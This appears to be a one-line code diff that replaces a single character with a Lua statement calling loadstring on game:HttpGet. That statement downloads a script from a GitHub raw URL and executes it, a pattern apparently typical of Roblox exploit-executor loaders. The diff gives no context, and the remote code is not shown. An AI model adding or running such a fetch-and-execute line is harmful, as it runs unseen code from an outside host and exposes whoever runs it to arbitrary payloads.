@@ -1,1 +1,1 @@
-g
+loadstring(game:HttpGet('https://raw.githubusercontent.com/jackthething/yes/main/test'))()
